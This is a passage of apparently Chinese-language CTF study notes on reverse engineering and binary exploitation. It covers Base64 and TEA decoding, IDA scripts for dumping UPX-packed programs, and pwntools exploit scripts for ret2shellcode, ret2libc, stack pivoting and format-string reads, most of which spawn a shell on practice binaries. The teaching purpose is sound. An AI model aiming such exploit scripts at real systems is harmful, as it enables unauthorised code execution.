a2[1]);</span><br><span class="line">      v6 += 0x61C88647;</span><br><span class="line">    &#125;</span><br><span class="line">    input[2 * i] = v4;</span><br><span class="line">    input[2 * i + 1] = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  return input;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main()&#123;</span><br><span class="line">    // char sbox[0x20] = &#123;0x2c,0xf2,0xfa,0xaf,0xde,0x5d,0x25,0x9b,0x1d,0x46,0xf7,0xbf,0xac,0x1d,0x6,0xf8,0x89,0x81,0x89,0x90,0x63,0x18,0xe0,0x52,0x40,0x35,0xb3,0xf8,0x84,0xc2,0xc2,0xa&#125;;</span><br><span class="line">    // char encs[0x20] = &#123;0x4a,0x9e,0x9b,0xc8,0xa5,0x0f,0x46,0xaf,0x42,0x77,0x84,0xe0,0xda,0x78,0x54,0x81,0xd6,0xc4,0xe8,0xe3,0x1a,0x47,0xdf,0x6d,0x7f,0x0a,0x92,0xd9,0xa5,0xe3,0xe3,0x77&#125;;</span><br><span class="line">    // for(int i = 0;i &lt; 0x20;i++)&#123;</span><br><span class="line">    //     printf(&quot;%c&quot;,sbox[i] ^ encs[i]);</span><br><span class="line">    // &#125;</span><br><span class="line">    int v6[4]; // [rsp+10h] [rbp-70h] BYREF</span><br><span class="line">    int v7[8]; // [rsp+20h] [rbp-60h]</span><br><span class="line">    v6[0] = 2;</span><br><span class="line">    v6[1] = 2;</span><br><span class="line">    v6[2] = 3;</span><br><span class="line">    v6[3] = 4;</span><br><span class="line">    v7[0] = -1470382171;</span><br><span class="line">    v7[1] = -1306776470;</span><br><span class="line">    v7[2] = -493086181;</span><br><span class="line">    v7[3] = -830502225;</span><br><span class="line">    v7[4] = -1404646180;</span><br><span class="line">    v7[5] = -1709980072;</span><br><span class="line">    v7[6] = -2143713582;</span><br><span class="line">    v7[7] = -1418567558;</span><br><span class="line">    decrypt(v7,v6);</span><br><span class="line">    printf(&quot;%sn&quot;,v7);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><p>标准 Base64 里的 64 个可打印字符是A-Za-z0-9+&#x2F;分别依次对应索引值 0-63。索引表如下： </p>
<p><img src="/images/reverse%E5%9F%BA%E7%A1%80/202310021642_6ZSSQTCH4J67SKD-1698239762564-4.jpg"></p>
<p>编码时，每 3 个字节一组，共 8bit*3&#x3D;24bit，划分成 4 组，即每 6bit 代表一个编码后的索引值，划分如下图所示：</p>
<p><img src="/images/reverse%E5%9F%BA%E7%A1%80/202310021643_XMYCR4MABAECR7N.jpg"></p>
<p>如果待编码内容的字节数不是 3 的整数倍，那需要进行一些额外的处理。如果最后剩下 1 个字节，那么将补 4 个 0 位，编码成 2 个 Base64 字符，然后补两个&#x3D;。如果最后剩下 2 个字节，那么将补 2 个 0 位，编码成 3 个 Base64 字符，然后补一个&#x3D;。</p>
<h3 id="python解密脚本"><a href="#python解密脚本" class="headerlink" title="python解密脚本"></a>python解密脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">str1 = &quot;I9sQ3C9ocs7MOMNIVdacEeZ00ntokyRPhKsM9OEksdhnJLrLi3KG0JH16O1zCaoAgTVrsyw7o8FItZEgmv+cB2ZQtaFULMGKTPssKQgFq38mv7rVTBnQvfeO2JZKPoGSkcVUPA==&quot;</span><br><span class="line"></span><br><span class="line">string1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/&quot;</span><br><span class="line">string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="line"></span><br><span class="line">print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))</span><br></pre></td></tr></table></figure>

<h1 id="加壳与脱壳"><a href="#加壳与脱壳" class="headerlink" title="加壳与脱壳"></a><strong>加壳与脱壳</strong></h1><p><strong>OEP(Original Entry Point)，程序的入口点。</strong>软件加壳一般隐藏了程序真实的OEP（或者用了假的OEP）， 我们需要寻找程序真正的OEP，才可以完成脱壳。</p>
<p><img src="/images/reverse%E5%9F%BA%E7%A1%80/image-20231025212712004.png" alt="image-20231025212712004"></p>
<p><img src="/images/reverse%E5%9F%BA%E7%A1%80/image-20231025212756917.png" alt="image-20231025212756917"></p>
<h3 id="脱壳UPX"><a href="#脱壳UPX" class="headerlink" title="脱壳UPX"></a>脱壳UPX</h3><p>放到ida中进行分析，下一个断点后按F9后进入调试，按F8进行单步步过，跳掉RSP这里下F2断点。按F9运行，往下翻一直翻到没有代码的地方，断点下在最后一个汇编指令中。按F7进行单步步入调试，进入后既是OEP地址。按shift+F2，将下面的代码粘贴上去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;idc.idc&gt;</span><br><span class="line">#define PT_LOAD              1</span><br><span class="line">#define PT_DYNAMIC           2</span><br><span class="line">static main(void)</span><br><span class="line">&#123;</span><br><span class="line">         auto ImageBase,StartImg,EndImg;</span><br><span class="line">         auto e_phoff;</span><br><span class="line">         auto e_phnum,p_offset;</span><br><span class="line">         auto i,dumpfile;</span><br><span class="line">         ImageBase=0x400000;</span><br><span class="line">         StartImg=0x400000;</span><br><span class="line">         EndImg=0x0;</span><br><span class="line">         if (Dword(ImageBase)==0x7f454c46 || Dword(ImageBase)==0x464c457f )</span><br><span class="line">  &#123;</span><br><span class="line">    if(dumpfile=fopen(&quot;dumpfile&quot;,&quot;wb&quot;))</span><br><span class="line">    &#123;</span><br><span class="line">      e_phoff=ImageBase+Qword(ImageBase+0x20);</span><br><span class="line">      Message(&quot;e_phoff = 0x%x\n&quot;, e_phoff);</span><br><span class="line">      e_phnum=Word(ImageBase+0x38);</span><br><span class="line">      Message(&quot;e_phnum = 0x%x\n&quot;, e_phnum);</span><br><span class="line">      for(i=0;i&lt;e_phnum;i++)</span><br><span class="line">      &#123;</span><br><span class="line">         if (Dword(e_phoff)==PT_LOAD || Dword(e_phoff)==PT_DYNAMIC)</span><br><span class="line">                         &#123;</span><br><span class="line">                                 p_offset=Qword(e_phoff+0x8);</span><br><span class="line">                                 StartImg=Qword(e_phoff+0x10);</span><br><span class="line">                                 EndImg=StartImg+Qword(e_phoff+0x28);</span><br><span class="line">                                 Message(&quot;start = 0x%x, end = 0x%x, offset = 0x%x\n&quot;, StartImg, EndImg, p_offset);</span><br><span class="line">                                 dump(dumpfile,StartImg,EndImg,p_offset);</span><br><span class="line">                                 Message(&quot;dump segment %d ok.\n&quot;,i);</span><br><span class="line">                         &#125;</span><br><span class="line">         e_phoff=e_phoff+0x38;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      fseek(dumpfile,0x3c,0);</span><br><span class="line">      fputc(0x00,dumpfile);</span><br><span class="line">      fputc(0x00,dumpfile);</span><br><span class="line">      fputc(0x00,dumpfile);</span><br><span class="line">      fputc(0x00,dumpfile);</span><br><span class="line"></span><br><span class="line">      fseek(dumpfile,0x28,0);</span><br><span class="line">      fputc(0x00,dumpfile);</span><br><span class="line">      fputc(0x00,dumpfile);</span><br><span class="line">      fputc(0x00,dumpfile);</span><br><span class="line">      fputc(0x00,dumpfile);</span><br><span class="line">      fputc(0x00,dumpfile);</span><br><span class="line">      fputc(0x00,dumpfile);</span><br><span class="line">      fputc(0x00,dumpfile);</span><br><span class="line">      fputc(0x00,dumpfile);</span><br><span class="line"></span><br><span class="line">      fclose(dumpfile);</span><br><span class="line">        &#125;else Message(&quot;dump err.&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">static dump(dumpfile,startimg,endimg,offset)</span><br><span class="line">&#123;</span><br><span class="line">        auto i;</span><br><span class="line">        auto size;</span><br><span class="line">        size=endimg-startimg;</span><br><span class="line">        fseek(dumpfile,offset,0);</span><br><span class="line">        for ( i=0; i &lt; size; i=i+1 )</span><br><span class="line">        &#123;</span><br><span class="line">        fputc(Byte(startimg+i),dumpfile);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>32位脱壳脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;idc.idc&gt;</span><br><span class="line">#define PT_LOAD              1</span><br><span class="line">#define PT_DYNAMIC           2</span><br><span class="line">static main(void)</span><br><span class="line">&#123;</span><br><span class="line">        Message(&quot;start&quot;);</span><br><span class="line">        auto ImageBase,StartImg,EndImg;</span><br><span class="line">        auto e_phoff;</span><br><span class="line">        auto e_phnum,p_offset;</span><br><span class="line">        auto i,dumpfile;</span><br><span class="line">        ImageBase=0x8048000;</span><br><span class="line">        StartImg=0x8000000;</span><br><span class="line">        EndImg=0x0;</span><br><span class="line">        if (Dword(ImageBase)==0x7f454c46 || Dword(ImageBase)==0x464c457f )&#123;</span><br><span class="line">                if(dumpfile=fopen(&quot;dumpfile&quot;,&quot;wb&quot;))</span><br><span class="line">                &#123;</span><br><span class="line">                        e_phoff=ImageBase+Dword(ImageBase+0x1c);</span><br><span class="line">                        Message(&quot;e_phoff = 0x%x\n&quot;, e_phoff);</span><br><span class="line">                        e_phnum=Word(ImageBase+0x30);</span><br><span class="line">                        Message(&quot;e_phnum = 0x%x\n&quot;, e_phnum);</span><br><span class="line">                        for(i=0;i&lt;e_phnum;i++)</span><br><span class="line">                        &#123;</span><br><span class="line">                                if (Dword(e_phoff)==PT_LOAD || Dword(e_phoff)==PT_DYNAMIC)</span><br><span class="line">                                &#123;</span><br><span class="line">                                        p_offset=Dword(e_phoff+0x4);</span><br><span class="line">                                        StartImg=Dword(e_phoff+0x8);</span><br><span class="line">                                        EndImg=StartImg+Dword(e_phoff+0x14);</span><br><span class="line">                                        Message(&quot;start = 0x%x, end = 0x%x, offset = 0x%x\n&quot;, StartImg, EndImg, p_offset);</span><br><span class="line">                                        dump(dumpfile,StartImg,EndImg,p_offset);</span><br><span class="line">                                        Message(&quot;dump segment %d ok.\n&quot;,i);</span><br><span class="line">                                &#125;</span><br><span class="line">                                e_phoff=e_phoff+0x20;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        fseek(dumpfile,0x20,0);</span><br><span class="line">                        fputc(0x00,dumpfile);</span><br><span class="line">                        fputc(0x00,dumpfile);</span><br><span class="line">                        fputc(0x00,dumpfile);</span><br><span class="line">                        fputc(0x00,dumpfile);</span><br><span class="line"></span><br><span class="line">                        fseek(dumpfile,0x30,0);</span><br><span class="line">                        fputc(0x00,dumpfile);</span><br><span class="line">                        fputc(0x00,dumpfile);</span><br><span class="line">                        fputc(0x00,dumpfile);</span><br><span class="line">                        fputc(0x00,dumpfile);</span><br><span class="line"></span><br><span class="line">                        fclose(dumpfile);</span><br><span class="line">                &#125;else Message(&quot;dump err.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">static dump(dumpfile,startimg,endimg,offset)</span><br><span class="line">&#123;</span><br><span class="line">        auto i;</span><br><span class="line">        auto size;</span><br><span class="line">        size=endimg-startimg;</span><br><span class="line">        fseek(dumpfile,offset,0);</span><br><span class="line">        for ( i=0; i &lt; size; i=i+1 )</span><br><span class="line">        &#123;</span><br><span class="line">                fputc(Byte(startimg+i),dumpfile);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后恢复符号表。按Shfit+F5，点击右键Apply new signature，可以在GitHub搜索sig-databas放到sig的pc目录。</p>
<h1 id="基本的栈溢出"><a href="#基本的栈溢出" class="headerlink" title="基本的栈溢出"></a>基本的栈溢出</h1><p>将函数返回地址覆盖成后门地址，函数返回地址就在rbp的下一个地址。</p>
<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a><strong>ret2shellcode</strong></h1><p>shellcode —— 一段能达到我们目的的汇编代码（通常是拿shell） </p>
<p>•使用场景：当某个段存在WX权限时，可以尝试往里面写入shellcode并利用栈溢出跳转过去执行 </p>
<p>•当不需要手动构造shellcode时，可以利用pwntools提供的shellcode生成模块 —— shellcraft （需要设置架构）</p>
<p>•例如：</p>
<p>shellcraft.sh()</p>
<p>shellcraft.read(0, addr, 0x100)</p>
<p>shellcraft.write(1, addr, 0x100)</p>
<h2 id="jmp-rsi"><a href="#jmp-rsi" class="headerlink" title="jmp rsi"></a>jmp rsi</h2><p>64位是靠寄存器传参，即前6个参数分别放入相应的的寄存器中(RDI,RSI,RDX,RCX,R8,R9)。这里用一个例子。如图：</p>
<p><img src="/images/reverse%E4%B8%8Epwn%E5%9F%BA%E7%A1%80/image-20231105131450894.png" alt="image-20231105131450894"></p>
<p>read这里存在一个栈溢出的可能，同时函数中有一个backdoor，但是backdoor里面只有<code>asm&#123;jmp rsi&#125;;</code></p>
<p><img src="/images/reverse%E4%B8%8Epwn%E5%9F%BA%E7%A1%80/image-20231105132045480.png" alt="image-20231105132045480"></p>
<p>如图所示，一开始rsi与rsp都指向栈顶，read函数执行到最后rip指向<code>jmp rsi</code>回到栈顶，如果一开始输入的是shellcode并且没开NX保护，那么程序会执行shellcode从而获得flag。</p>
<p>代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.binary=&#x27;/home/ubuntu/reverse/jmprsi&#x27;#设置机器信息，便于生成shellcode</span><br><span class="line">#context.arch = &#x27;amd64&#x27;</span><br><span class="line">#context.arch = &#x27;i386&#x27;</span><br><span class="line">p=process(&#x27;/home/ubuntu/reverse/jmprsi&#x27;)</span><br><span class="line">shellcode=shellcraft.sh()</span><br><span class="line">payload=asm(shellcode)</span><br><span class="line">print(len(payload))#查看payload长度，计算还要填充的数量</span><br><span class="line">payload+=&#x27;a&#x27;*80</span><br><span class="line">payload+=&#x27;b&#x27;*0x8</span><br><span class="line">payload+=p64(0x40117E)</span><br><span class="line">p.recvuntil(&#x27;Pls Input&#x27;)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>如果程序比较复杂，可以用ROPgadget，使用如下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary &quot;/home/ubuntu/reverse/jmprsi&quot; --only &quot;jmp|ret&quot;</span><br></pre></td></tr></table></figure>

<p><code>jmp|ret</code>代表可以找到jmp某寄存器的ret。</p>
<p>可以使用<code>attach(p)</code>来调用gdb调试程序。但打远程需要注释掉。</p>
<h2 id="jmp-rsp"><a href="#jmp-rsp" class="headerlink" title="jmp rsp"></a>jmp rsp</h2><p>继续使用一个例子。如图所示，</p>
<p><img src="/images/reverse%E4%B8%8Epwn%E5%9F%BA%E7%A1%80/image-20231105140329116.png" alt="image-20231105140329116"></p>
<p>read仍然有栈溢出的风险，且存在一个<code>backdoor1</code>函数，该函数的代码为<code>asm&#123;jmp,rsp&#125;</code>。</p>
<p>如图为当前栈的布局</p>
<p><img src="/images/reverse%E4%B8%8Epwn%E5%9F%BA%E7%A1%80/image-20231105140921110.png" alt="image-20231105140921110"></p>
<p>当把返回地址改成<code>jmp rsp</code>后，程序最后两条指令是<code>leave</code>与<code>retn</code>，<code>leave</code>是<code>mov rsp,rbp</code>与<code>pop rbp</code>，<code>retn</code>是<code>pop rip</code>，最后结果如图所示</p>
<p><img src="/images/reverse%E4%B8%8Epwn%E5%9F%BA%E7%A1%80/image-20231105141610680.png" alt="image-20231105141610680"></p>
<p>也就是说只要在返回地址后传入shellcode就行，前提仍然是没开NX保护。所以解题代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.binary=&#x27;/home/ubuntu/reverse/jmprsp&#x27;</span><br><span class="line">#context.arch = &#x27;amd64&#x27;</span><br><span class="line">#context.arch = &#x27;i386&#x27;</span><br><span class="line">p=process(&#x27;/home/ubuntu/reverse/jmprsp&#x27;)</span><br><span class="line">payload=&#x27;a&#x27;*0x20+&#x27;b&#x27;*0x8</span><br><span class="line">payload+=p64(0x40117e)#jmp rsp地址</span><br><span class="line">payload+=asm(shellcraft.sh())</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道 system 函数的地址。</p>
<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>没有一些后门函数，也没有一些好用的gadget让我们执行shellcode的时候。</p>
<h2 id="plt-got"><a href="#plt-got" class="headerlink" title="plt&amp;&amp; got"></a>plt&amp;&amp; got</h2><p>plt：库函数的入口地址。</p>
<p>got：一个容器，里面存放的是我们函数的真实地址(真实地址&#x3D;基地址+偏移地址)。</p>
<p>程序是程序，库是库。</p>
<h2 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h2><p>这类题型通常有两个文件，用ida打开ret2libc文件后反编译得到如图</p>
<p><img src="/images/reverse%E4%B8%8Epwn%E5%9F%BA%E7%A1%80/image-20231105143948784.png" alt="image-20231105143948784"></p>
<p>read函数仍然存在战溢出的风险。且没有后门函数。</p>
<p><strong>接下来就是泄露got表里的函数真实地址从而得到库函数的偏移地址，进一步通过基地址+对印的偏移地址得到想要函数如(system)的地址。</strong></p>
<p>通常使用输出函数打印出某个函数的真实地址。</p>
<p>这里通过rop做一个函数的调用，比如调用一个puts函数使它的参数变成一个函数的got表地址。执行完puts后再次将函数返回到main函数进行第二次的栈溢出。由于第一次泄露出来的真实地址可以通过计算得到基地址，就可以得到想要函数的真实地址。就可以使用栈溢出调用一个链子，使其执行system函数并且参数是“&#x2F;bin&#x2F;sh”。构造情况如下：</p>
<p><img src="/images/reverse%E4%B8%8Epwn%E5%9F%BA%E7%A1%80/image-20231105145610105.png" alt="image-20231105145610105"></p>
<p><code>pop rdi ret</code>会将栈顶的数据也就是read_got赋值得rdi(因为后面调用的puts只有一个参数，所以用rdi)</p>
<p>使用<code>ROPgadget --binary “./ret2libc” --only &quot;pop|ret&quot;</code>来获取<code>pop rdi ret</code> </p>
<p>查看got的方法：</p>
<ol>
<li>使用ida ctrl+s转到.got.plt表即可查看对应函数的got表地址</li>
</ol>
<p>查找puts的plt可以到ida的function name窗口下的前面有下划线并且有红色打底的地方就是对应函数的plt表。</p>
<p>接下来查找main函数的入口，因为main函数不是库函数而是自己定义的，所以直接找即可。</p>
<p>第一个泄露函数地址的代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.binary=&#x27;/home/ubuntu/reverse/ret2libc&#x27;</span><br><span class="line">context.log_level=&#x27;debug&#x27;#用于接收数据</span><br><span class="line">#context.arch = &#x27;amd64&#x27;</span><br><span class="line">#context.arch = &#x27;i386&#x27;</span><br><span class="line">p=process(&#x27;/home/ubuntu/reverse/ret2libc&#x27;)</span><br><span class="line">pop_rdi_ret=0x0000000000401293</span><br><span class="line">read_got=0x403368</span><br><span class="line">puts_plt=0x401060</span><br><span class="line">main_addr=0x401176</span><br><span class="line">#p=remote(&#x27;123.59.196.133&#x27;,10002)</span><br><span class="line">payload=&#x27;a&#x27;*0x20+&#x27;b&#x27;*0x8</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main_addr)</span><br><span class="line">p.recvuntil(&quot;Pls Input&quot;)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/images/reverse%E4%B8%8Epwn%E5%9F%BA%E7%A1%80/image-20231105152240125.png" alt="image-20231105152240125"></p>
<p>多次运行得数据都是以\x7f结尾。</p>
<p>在<code>p.send(payload)</code>后加上<code>read_address=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00))</code>(64中地址在内存占6个字符)。</p>
<p>由此我们可以得出read函数的真实地址。</p>
<p>可以在<code>print(hex(read_address))</code>后面加上<code>attach(p)</code>后进入gdb，输入<code>p read</code> 如果地址一样，那么就是正确的。</p>
<p>因为该程序开了ASLR保护(地址随机化保护)，所以每次算出的地址不一样。</p>
<p><strong>接下来就是查找偏移地址。</strong></p>
<p>使用ldd查看程序的依赖库。</p>
<p><code>ldd ret2libc</code></p>
<p><img src="/images/reverse%E4%B8%8Epwn%E5%9F%BA%E7%A1%80/image-20231105155707226.png" alt="image-20231105155707226"></p>
<p>判断一个libc的基地址是否正确，可以查看它的16进制后3位是否为0，也可以在gdb中输入libc判断基地址是否正确。</p>
<p>继续完善代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = process(&quot;./ret2libc&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">pop_rdi_ret = 0x0000000000401293</span><br><span class="line">read_got = 0x403368</span><br><span class="line">puts_plt = 0x401060</span><br><span class="line">main_addr = 0x401176</span><br><span class="line">payload = &#x27;a&#x27;*0x20</span><br><span class="line">payload += &#x27;b&#x27;*0x8</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(read_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line">p.recvuntil(&quot;Pls Input&quot;)</span><br><span class="line">p.send(payload)</span><br><span class="line">read_address = u64(p.recvuntil(&#x27;x7f&#x27;)[-6:].ljust(8,&#x27;x00&#x27;))</span><br><span class="line">print(hex(read_address))</span><br><span class="line">libc_base = read_address - libc.sym[&quot;read&quot;]#sym搜索相应的函数</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">system_address = libc_base + libc.sym[&quot;system&quot;]</span><br><span class="line">binsh_addr = libc_base + libc.search(&quot;/bin/sh&quot;).next()</span><br><span class="line">payload = &#x27;a&#x27;*0x20</span><br><span class="line">payload += &#x27;b&#x27;*0x8</span><br><span class="line">payload += p64(0x000000000040101a)#ret，用于堆栈平衡</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_address)</span><br><span class="line">p.recvuntil(&quot;Pls Input&quot;)</span><br><span class="line">p.send(payload)</span><br><span class="line">#attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="栈迁移-stack-pivoting"><a href="#栈迁移-stack-pivoting" class="headerlink" title="栈迁移(stack pivoting)"></a>栈迁移(stack pivoting)</h1><p>正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting</p>
<h3 id="适用常景"><a href="#适用常景" class="headerlink" title="适用常景"></a>适用常景</h3><p>(1) 可以控制的栈溢出的字节数较少，<strong>难以构造较长的 ROP 链</strong></p>
<p>(2) <strong>开启了 PIE 保护</strong>，栈地址未知，我们可以将栈劫持到已知的区域。 </p>
<p>(3) 其它漏洞难以利用，我们<strong>需要进行转换</strong>，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</p>
<p>此外，利用 stack pivoting 有以下几个要求</p>
<h3 id="stack-pivoting的要求"><a href="#stack-pivoting的要求" class="headerlink" title="stack pivoting的要求"></a>stack pivoting的要求</h3><p>(1) 可以控制程序执行流。</p>
<p>(2)可以控制 sp 指针。一般来说，控制栈指针会使用 ROP，<strong>常见的控制栈指针的 gadgets 一般是pop rsp&#x2F;esp</strong>。</p>
<p><img src="/images/reverse%E4%B8%8Epwn%E5%9F%BA%E7%A1%80/image-20231111170159907.png" alt="image-20231111170159907"></p>
<p>后面两块的地址无法覆盖。</p>
<p><img src="/images/reverse%E4%B8%8Epwn%E5%9F%BA%E7%A1%80/image-20231111170551296.png" alt="image-20231111170551296"></p>
<p>使用<code>leave_re</code>t将rsp指向<code>0x405448</code>的地址(<code>leave=mov rsp,rbp;pop rbp;</code>call在执行时会先将下一条指令所对应的rip地址入栈，然后修改rip的值实现跳转, ret指令执行的时候，将rip地址pop出来进行跳转),因为之前在<code>0x405448</code>中放置了ROP链子，所以将在<code>0x405448</code>中获得shell。</p>
<p>解题模板为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p = process(&quot;stackpivoting&quot;)</span><br><span class="line">pop_rdi_ret = 0x00000000004012e3</span><br><span class="line">binsh_addr = 0x4033F8</span><br><span class="line">sys_addr = 0x401080</span><br><span class="line">leave_ret = 0x000000000040127c</span><br><span class="line">payload = &#x27;a&#x27;*0x8</span><br><span class="line">payload += p64(0x000000000040101a)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)#bssbuf</span><br><span class="line">payload = &#x27;a&#x27;*0x20</span><br><span class="line">payload += p64(0x405440)#bssbuf</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p>格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C&#x2F;C++ 程序都会利用格式化字符串函数来输出信息，调试程序，或者处理字符串。一般来说，格式化字符串在利用的时候主要分为三个部分。</p>
<ol>
<li><p>格式化字符串函数</p>
</li>
<li><p>格式化字符串 </p>
</li>
<li><p>后续参数，可选</p>
</li>
</ol>
<h2 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a><strong>格式化字符串函数</strong></h2><p>输入:scanf</p>
<p>输出：</p>
<p><img src="/images/reverse%E4%B8%8Epwn%E5%9F%BA%E7%A1%80/202310161704_DT585ZZ7VUWYW3N.jpg" alt="202310161704_DT585ZZ7VUWYW3N"></p>
<h2 id="格式化字符串漏洞常用参数"><a href="#格式化字符串漏洞常用参数" class="headerlink" title="格式化字符串漏洞常用参数"></a>格式化字符串漏洞常用参数</h2><h3 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h3><p><img src="/images/reverse%E4%B8%8Epwn%E5%9F%BA%E7%A1%80/202310161706_SBYEDDWBNVCAASV.jpg" alt="202310161706_SBYEDDWBNVCAASV"></p>
<h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p><img src="/images/reverse%E4%B8%8Epwn%E5%9F%BA%E7%A1%80/202310161704_DT585ZZ7VUWYW3N-1700193981713-3.jpg" alt="202310161704_DT585ZZ7VUWYW3N"></p>
<p><code>printf</code>打印完当前函数的剩余参数之后，就会打印当前函数的栈帧(包括返回地址和参数等)。</p>
<p><img src="/images/reverse%E4%B8%8Epwn%E5%9F%BA%E7%A1%80/image-20231117122436371.png" alt="image-20231117122436371"></p>
<p>在第2层栈中输入<code>flag_addr</code>那么在第三层中会输出<code>flag_addr</code>中的内容，可以在第二层栈中存放<code>flag_addr</code>,根据第一层栈确定参数的位置，然后通过%s输出flag中的内容。可以用<code>fmtarg</code>加上第一层栈的地址来确定所需的参数个数<code>flag_addr</code>的地址不能放的靠前，因为地址补齐0会让<code>printf</code>提前解析。<code>%10$s</code>表示栈上的第10个参数。<strong>任意地址读</strong>脚本模板为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p = process(&quot;./fmt_0&quot;)</span><br><span class="line">payload = &quot;%10$s&quot;</span><br><span class="line">payload = payload.ljust(0x20,&quot;a&quot;)</span><br><span class="line">payload += p64(0x404480)</span><br><span class="line"> </span><br><span class="line">#payload = p64(0x404480)</span><br><span class="line"> </span><br><span class="line">#payload += &quot;a&quot;*0x20</span><br><span class="line">#payload += &quot;%6$s&quot;</span><br><span class="line"> </span><br><span class="line">p.recvuntil(&quot;Strings&quot;)</span><br><span class="line">#attach(p,&quot;b printf&quot;)#调试的时候在printf下断点。</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="UAF漏洞"><a href="#UAF漏洞" class="headerlink" title="UAF漏洞"></a>UAF漏洞</h1><h2 id="堆的概念"><a href="#堆的概念" class="headerlink" title="堆的概念"></a>堆的概念</h2><p>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。我们一般称管理堆的那部分程序为堆管理器。下图为运行时刻内存被划分为代码区和静态区的典型方式。</p>
<p><img src="/images/reverse%E4%B8%8Epwn%E5%9F%BA%E7%A1%80/image-20231117143851717.png" alt="image-20231117143851717"></p>
<p>堆管理器处于用户程序与内核中间，主要做以下工作：</p>
<ol>
<li>响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。同时，为了保持内存管理的高效性，内核一般会预先分配很大的一块连续的内存，然后让对管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。</li>
